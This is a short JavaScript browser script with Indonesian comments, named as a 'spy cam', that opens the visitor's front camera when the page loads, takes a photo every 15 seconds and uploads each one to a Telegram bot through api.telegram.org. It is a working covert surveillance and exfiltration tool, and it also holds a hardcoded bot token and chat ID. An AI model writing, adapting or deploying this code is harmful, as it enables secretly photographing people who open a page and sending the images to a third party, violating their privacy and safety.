// CONFIGURASI
const BOT_TOKEN = '7770985430:AAFuJIEHZ7ORrtih7i9K8Iu_57F41tsTLL4';  // Ganti dengan token dari @BotFather
const CHAT_ID = '7730972930';      // Ganti dengan chat ID dari @userinfobot
const INTERVAL = 15000;              // 15 detik

// ELEMEN
const statusEl = document.getElementById('status');

// FUNGSI UTAMA
async function initSpyCam() {
    try {
        // 1. Akses Kamera
        statusEl.textContent = 'Mengakses kamera...';
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        // 2. Setup Video
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        // 3. Auto Capture
        statusEl.textContent = 'Kamera aktif!';
        setInterval(async () => {
            await captureAndSend(video);
        }, INTERVAL);
        
    } catch (error) {
        statusEl.textContent = `Error: ${error.message}`;
        console.error('Error:', error);
    }
}

// FUNGSI CAPTURE + KIRIM
async function captureAndSend(video) {
    try {
        // 1. Buat Canvas
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // 2. Capture Frame
        ctx.drawImage(video, 0, 0);
        const imageBlob = await new Promise(resolve => 
            canvas.toBlob(resolve, 'image/jpeg', 0.8)
        );
        
        // 3. Kirim ke Telegram
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'capture.jpg');
        
        const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            { method: 'POST', body: formData }
        );
        
        const result = await response.json();
        console.log('Foto terkirim:', result);
        statusEl.textContent = `Terakhir dikirim: ${new Date().toLocaleTimeString()}`;
        
    } catch (error) {
        console.error('Gagal mengirim:', error);
        statusEl.textContent = 'Gagal mengirim foto';
    }
}

// JALANKAN
initSpyCam();
